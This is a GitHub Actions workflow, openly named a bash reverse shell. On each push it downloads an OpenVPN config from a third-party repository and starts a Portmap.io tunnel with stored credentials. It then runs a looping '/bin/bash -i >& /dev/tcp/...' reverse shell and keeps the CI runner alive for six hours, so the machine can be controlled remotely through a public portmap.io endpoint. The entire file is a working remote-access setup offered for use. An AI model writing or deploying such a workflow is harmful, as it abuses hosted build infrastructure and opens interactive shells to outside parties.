name: Bash Reverse Shell with Portmap.io (Updated Tunnel - Download OVPN)

on:
  push:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - uses: actions/checkout@v4

      - name: Install Dependencies
        run: |
          sudo apt update
          sudo apt install -y openvpn netcat-openbsd wget

      - name: Download OpenVPN Configuration
        run: |
          echo "=== Downloading OpenVPN Configuration ==="
          wget https://raw.githubusercontent.com/lust001/openvpn/refs/heads/main/vpsfree9009.anonymous1.ovpn -O anonymous1-22216.ovpn
          ls -l

      - name: Configure Portmap.io Tunnel
        env:
          PORTMAP_USERNAME: ${{ secrets.PORTMAP_USERNAME }}
          PORTMAP_PASSWORD: ${{ secrets.PORTMAP_PASSWORD }}
        run: |
          echo "=== Setting up Portmap.io tunnel ==="
          # Save OpenVPN auth file
          echo "$PORTMAP_USERNAME" > auth.txt
          echo "$PORTMAP_PASSWORD" >> auth.txt
          sudo chmod 600 auth.txt
          # Update OpenVPN config to use auth file
          sudo sed -i '/auth-user-pass/c\auth-user-pass auth.txt' anonymous1-22216.ovpn
          # Start OpenVPN tunnel
          sudo openvpn --config anonymous1-22216.ovpn --daemon
          sleep 10
          echo "=== OpenVPN Status ==="
          ps aux | grep '[o]penvpn' || echo "No OpenVPN process found"
          echo "=== Tunnel Endpoint ==="
          echo "tcp://vpsfree9009-22216.portmap.io:22216"

      - name: Start Bash Reverse Shell
        run: |
          echo "=== Starting reverse shell ==="
          # Test connectivity to localhost:9001
          nc -zv localhost 9001 || echo "Cannot connect to localhost:9001"
          # Start reverse shell with reconnection loop
          while true; do
            /bin/bash -i >& /dev/tcp/localhost/9001 0>&1
            sleep 10
          done &
          sleep 5
          ps aux | grep '[b]ash' || echo "No bash reverse shell process found"
          echo "=== Reverse shell started, connect to tcp://vpsfree9009-22216.portmap.io:22216 ==="
          # Keep workflow alive for 6 hours
          for i in {1..360}; do
            ps aux | grep '[b]ash' || echo "Reverse shell process stopped"
            ps aux | grep '[o]penvpn' || echo "OpenVPN process stopped"
            sleep 60
          done
